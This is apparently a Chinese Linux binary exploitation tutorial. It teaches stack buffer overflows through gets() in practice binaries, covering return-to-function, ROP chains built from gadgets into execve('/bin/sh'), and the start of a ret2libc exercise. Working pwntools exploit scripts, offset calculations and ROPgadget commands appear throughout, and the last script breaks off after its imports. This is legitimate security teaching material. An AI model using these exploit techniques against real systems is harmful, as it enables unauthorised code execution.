@@ -1,0 +1,289 @@
+
+# [分享] Linux PWN从入门到熟练
+
+本文首发于安全客： <mark class="encrypted">d2eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2S2L8Y4q4#2j5h3&6C8k6g2)9J5k6h3y4G2L8g2)9J5c8Y4m8G2M7%4c8Q4x3V1k6A6k6q4)9J5c8U0p5$3y4o6f1K6x3l9`.`.</mark>
+
+![](upload/attach/202002/93\_ZZTU9ZF7NKH3WS5.png)
+
+最近在复习pwn的一些知识。主要涉及到当堆栈开启了保护的时候，我们不能够直接将shellcode覆盖到堆栈中执行，而需要利用程序其他部分的可执行的小片段来连接成最终的shellcode。此小片段就是gadgets。本文主要通过练习题的方式讲述如何寻找gadgets，如何利用现有的工具来加速自己的pwn的效率。Gadgets的类型和难度也逐步变化。下面带来手把手教你linux pwn。让你的pwn技术从入门到熟练。练习题的难度逐步加大。
+
+## 第一关
+
+第一关的gadgets较为简单，包含了一个直接可以利用的，可返回shell的函数。我们只要计算好覆盖的偏移，将可返回shell函数的地址覆盖到相应的位置即可以。程序下载：<a href="elink@518K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6V1k6i4y4%4L8%4u0V1i4K6u0r3M7s2N6F1i4K6g2X3k6i4S2W2j5%4u0A6M7$3g2Q4x3V1k6J5j5i4N6Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1k6H3N6$3&6Q4y4h3k6T1j5i4y4A6j5#2)9#2k6Y4u0G2M7q4)9J5c8Y4m8%4L8U0p5`.">`Pwn1`</a>
+
+我们首先来查看一下该程序的保护情况，发现开启了堆栈保护。即NX enabled。且是32bit的程序。因此需要在32位的linux环境下测试。
+
+![](upload/attach/202002/93\_Q88QTSETPBA67BG.png)
+
+这里涉及到一个工具，<a href="elink@2eaK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6K6L8r3W2E0L8e0j5H3z5g2)9J5c8X3y4Z5k6h3y4C8M7$3g2U0i4K6u0W2M7$3R3`.">`chechsec`</a>。该工具专门用来检测程序中受保护的情况，我们可以根据程序受保护的情况来选择对应的pwn策略。
+
+下载以后，直接在命令行中建立符号链接就可以在terminal中直接使用了
+
+```
+sudo ln –sf checksec /usr/bin/checksec
+```
+
+接下来我们利用IDA查看一下程序的源代码：
+
+![](upload/attach/202002/93\_YTASKH8ZHTJ5RP8.png)
+
+![](upload/attach/202002/93\_ZF58ZAWRZKBWYMG.png)
+
+可以发现漏洞出现在`gets()`里面，`gets()`函数存在缓冲区溢出漏洞，我们可以通过超长的字符串来覆盖缓冲区，从而修改ROP。为了达到这个目的，我们需要首先计算，输入的`&s`的堆栈地址位置距离堆栈的底部`ebp`的位置。`Ebp`的下一个地址，就是记录了返回地址的位置。在32位的程序中，就是`ebp+4`。其中，`Esp`是栈顶指针，`ebp`是栈底指针。`Esp -> ebp`，地址从小到大。小地址栈顶，大地址栈底。
+
+我们有两种方法可以得到`s`距离返回地址的偏移：徒手计算和利用`patternoffset`产生字符串。
+
+首先第一种方法，徒手计算。我们利用`gdb`的辅助工具`gef`来辅助查看`esp`地址。
+
+注意，这里需要按照这个辅助工具，<a href="elink@67eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6Z5N6h3N6K6P5g2)9J5c8X3N6W2k6R3`.`.">`gef`</a>，该工具会提供更加丰富的调试信息。包括堆栈信息，寄存器信息等。按照完毕之后，使用`gdb –q \*.elf`执行就可以。
+
+启动的程序之后，我们在上述`get()`函数的位置下断点，即`0x080486AE`
+
+![](upload/attach/202002/93\_SG7TQEHREAYJ27K.png)
+
+![](upload/attach/202002/93\_MEEJ2ZJ7ZAW68KQ.png)
+
+可以看到`esp`为`0xbfffeed0`，`ebp`为`0xbfffef58`，同时`s`相对于`esp`的索引为`[esp+80h-64h]` = `[esp+0x1c]`。所以`s`的地址为`0xbfffeeec`，所以`s`相对于`ebp`的偏移为`0x6C`（108），所以相对于返回地址的偏移为`0x6c+4`（112）。
+
+另外一种方法是利用`patternoffset`执行来计算。借助到这个工具<a href="elink@ffeK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6V1k6i4y4%4L8%4u0V1i4K6u0r3M7$3S2W2L8r3I4U0L8$3c8W2i4K6g2X3N6r3!0G2L8s2x3`.">`patternoffset`</a>。下载下来直接作为python脚本使用。利用下面的命令产生字符串到`test`的文件中：
+
+`python patternLocOffset.py -c -l 700 -f test`
+
+接着远程IDA挂载调试，在程序的返回位置下断点，即`retn`的位置。
+
+![](upload/attach/202002/93\_SB4J5HUFBC3EZB3.png)
+
+它会在远程的服务器端等待我的输入
+
+```
+~/ $ ./linux_server
+
+IDA Linux 32-bit remote debug server(ST) v1.22. Hex-Rays (c) 2004-2017
+
+Listening on 0.0.0.0:23946...
+
+=========================================================
+
+[1] Accepting connection from 192.168.110.1...
+
+There is something amazing here, do you know anything?
+```
+
+在这个位置，我就把产生的pattern计算字符串复制进去。（注意，如果这里始终没有让程序停下来让你输入对应的字符串进去的话，就断开ubuntu的server，然后重新连接一下，就会停下来等待我们的字符串输入）
+
+接着，查看程序覆盖的寄存器`ebp`的内容为`0x41366441`
+
+![](upload/attach/202002/93\_EYZQXYDGHT2X837.png)
+
+再利用`offset`的脚本计算一下输入的缓冲区地址距离`EBP`相差多少的字节，相差的是108个字节。`EBP`之后，存储的就是返回的地址，所以要加上`108+4=112`字节的偏移。
+
+![](upload/attach/202002/93\_7XVUBVHP5QXJAPW.png)
+
+得到的结果和上面是一致的。
+
+接下来，我们需要找到可以利用的系统调用函数。在IDA中搜索（alt+T）可以利用来的系统sh调用函数：
+
+![](upload/attach/202002/93\_WMW5JK9KPXJHXJR.png)
+
+最后，将需要覆盖的地址`0x0804863A`填入指定的位置覆盖，再利用`pwntools`来验证攻击。这里利用到了一个工具<a href="elink@32cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6s2j5h3I4D9L8%4m8K6L8r3g2V1i4K6u0r3M7s2N6F1N6r3!0G2L8s2x3`.">`pwntools`</a>。推荐使用基于源代码的安装方式，可以更为方便。
+
+安装方式为：
+
+```
+cd ~
+
+git clone <mark class="encrypted">9cdK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6S2M7i4g2&6L8X3S2Q4x3V1k6U0j5i4m8K6N6r3!0F1k6b7`.`.</mark>
+
+cd capstone
+
+make
+
+make install
+
+cd ~
+
+git clone <mark class="encrypted">f1cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6s2j5h3I4D9L8%4m8K6L8r3g2V1i4K6u0r3M7s2N6F1N6r3!0G2L8s2x3`.</mark>
+
+cd pwntools
+
+python setup.py install
+```
+
+验证：
+
+```
+>>> import pwn
+
+[!] Pwntools does not support 32-bit Python. Use a 64-bit release.
+
+>>> pwn.asm("xor eax, eax")
+
+'1\xc0'
+```
+
+使用下面的脚本来验证攻击：
+
+```
+from pwn import *
+
+pwn1 = process('./pwn1')
+
+target = 0x804863a
+
+pwn1.sendline('A' * (112) + p32(target))
+
+pwn1.interactive()
+```
+
+![](upload/attach/202002/93\_VAQ6Q5VP33M7A88.png)
+
+## 第二关
+
+在这一关中，没有可以直接利用的`system()`函数让我们直接调用了。我们可以学习使用系统调用来进行操作。系统调用的背景知识在<a href="elink@ffaK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6W2L8W2)9J5k6i4N6A6K9$3W2H3k6h3c8A6j5g2)9J5k6h3!0J5k6#2)9J5c8Y4N6A6K9$3W2Q4x3V1k6e0P5i4y4@1k6h3#2Q4y4h3k6U0j5h3I4D9">这里</a>。
+
+<a href="elink@789K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6V1k6i4y4%4L8%4u0V1i4K6u0r3M7s2N6F1i4K6g2X3k6i4S2W2j5%4u0A6M7$3g2Q4x3V1k6J5j5i4N6Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1k6H3N6$3&6Q4y4h3k6T1j5i4y4A6j5#2)9#2k6Y4u0G2M7q4)9J5c8Y4m8%4L8U0t1`.">`Pwn2`</a>
+
+Syscall的函数调用规范为： `execve("/bin/sh", 0,0)`;
+
+它对应的汇编代码为：
+
+```
+pop eax, # 系统调用号载入， execve为0xb
+
+pop ebx, # 第一个参数， /bin/sh的string
+
+pop ecx, # 第二个参数，0
+
+pop edx, # 第三个参数，0
+
+int 0x80, # 执行系统调用
+```
+
+同样的，首先利用工具来查看程序保护情况：
+
+![](upload/attach/202002/93\_AKWGQUYAXDYKX8Y.png)
+
+查看程序的代码，发现同样是`gets()`造成的函数溢出。
+
+![](upload/attach/202002/93\_ND4UHN2FDD4BZW5.png)
+
+因此我们这里需要人为的构造了。这里需要用到一个工具，来查到能够控制`eax`,`ebx`,`ecx`,`edx`。就是<a href="elink@9e7K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6v1L8$3&6S2N6r3S2S2L8W2y4S2L8s2N6S2L8W2)9J5c8W2u0a6f1r3N6S2k6r3N6W2N6l9`.`.">`ROPgadget`</a>。下载之后，直接安装
+
+`python setup.py install`
+
+就可以使用了。执行命令，来查找对一个的汇编指令：
+
+```
+ROPgadget --binary ret2syscall --only 'pop|ret' | grep "eax"
+```
+
+其中`--binary`表示目标二进制的路径，`--only`表示只显示指定的汇编语句，`grep`可以展示想要的寄存器。
+
+针对`eax`选择，`0x080bb196 : pop eax ; ret`
+
+![](upload/attach/202002/93\_VMYYGUU96ZQ2E47.png)
+
+针对`ebx`和`ecx`选择，`0x0806eb91 : pop ecx ; pop ebx ; ret`
+
+![](upload/attach/202002/93\_XUN6R7KRAT4YRB9.png)
+
+针对`edx`，选择，`0x0806eb6a : pop edx ; ret`
+
+![](upload/attach/202002/93\_K77SNJKKE3E2VXV.png)
+
+![](upload/attach/202002/93\_ST3BAGMZC4PE7UM.png)
+
+执行命令，筛选`int 0x80`的系统调用, 选择：`0x08049421`
+
+```
+ROPgadget --binary ret2syscall --only 'int'
+```
+
+![](upload/attach/202002/93\_2QHN5YCPMCKA7YA.png)
+
+执行命令，筛选字符串，得到：`0x080be408`
+
+```
+ROPgadget --binary ret2syscall --string '/bin/sh'
+```
+
+![](upload/attach/202002/93\_DXBXGDUVWMZF9A5.png)
+
+这里选择的每一个gadgets都含有`ret`是为了能够使得程序自动持续的选择堆栈中的指令依次执行。在构造这些gadgets之前，我们通过下面的堆栈指针移动图，来分析一下`eip`指针的移动，以及对应获取的数据内容。`ret`指令可以理解成去栈顶的数据作为下次跳转的位置。即，
+
+`eip = [esp];`
+
+`esp = esp+4;`
+
+或者简单理解成： `pop eip;`
+
+![](upload/attach/202002/93\_DGDDW6A78AF3BE9.png)
+
+上图中，左边显示的堆栈的内容，右边是对应的代码。数字表示的是，运行到特定的汇编指令的时候，`esp`指针的位置。总结下来，我们通过`pop`指令来移动`esp`指针获取数据，比如字符串`/bin/sh`，我们通过`ret`指令来同样移动`esp`指针来获取下一条执行的命令。这样，我们就能够在不需要与堆栈中执行程序的情况下，顺利的控制程序控制流的执行。
+
+最终形成的shellcode利用`pwntools`的代码为：
+
+```
+#!/usr/bin/env python
+
+from pwn import *
+
+sh = process('./ret2syscall')
+
+pop_eax_ret = 0x080bb196
+
+pop_ecx_ebx_ret = 0x0806eb91
+
+pop_edx_ret = 0x0806eb6a
+
+int_0x80 = 0x08049421
+
+binsh = 0x80be408
+
+payload = flat(
+['A' * 112, pop_eax_ret, 0xb, pop_ecx_ebx_ret, 0,binsh, pop_edx_ret,0, int_0x80])
+
+sh.sendline(payload)
+
+sh.interactive()
+```
+
+![](upload/attach/202002/93\_BS3H89GDXCHNKP5.png)
+
+## 第三关
+
+这一关中，我们主要通过导入函数里面的`system("/bin/sh")`函数来完成调用。
+
+<a href="elink@8cbK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6V1k6i4y4%4L8%4u0V1i4K6u0r3M7s2N6F1i4K6g2X3k6i4S2W2j5%4u0A6M7$3g2Q4x3V1k6J5j5i4N6Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1k6H3N6$3&6Q4y4h3k6T1j5i4y4A6j5#2)9#2k6Y4u0G2M7q4)9J5c8Y4m8%4L8U0x3`.">`Pwn3`</a>
+
+![](upload/attach/202002/93\_9HHRXJ4VZTXJS5K.png)
+
+发现它的保护也是类似的。该程序与之前类似，都是在`gets()`函数存在漏洞。
+
+首先查找`system()`函数是否存在，利用IDA查看。
+
+查看导入函数表，发现有`system()`的外部调用函数在列表里面，
+
+![](upload/attach/202002/93\_ZCACAH5KSKQ3F7B.png)
+
+![](upload/attach/202002/93\_PEGDHKZKST373HD.png)
+
+![](upload/attach/202002/93\_RUNZ483QQ3Z67CZ.png)
+
+从而确定地址为`0x08048460`。
+
+再利用下面的命令查找`/bin/sh`的字符串，确定了字符串的地址为`0x08048720`
+
+```
+ROPgadget --binary ret2libc1 --string "/bin/sh"
+```
+
+![](upload/attach/202002/93\_RMN73BADD67C76Z.png)
+
+那么就可以依葫芦画瓢的构造shellcode了。
+
+```
+#!/usr/bin/env python
+
+from pwn import *
+```
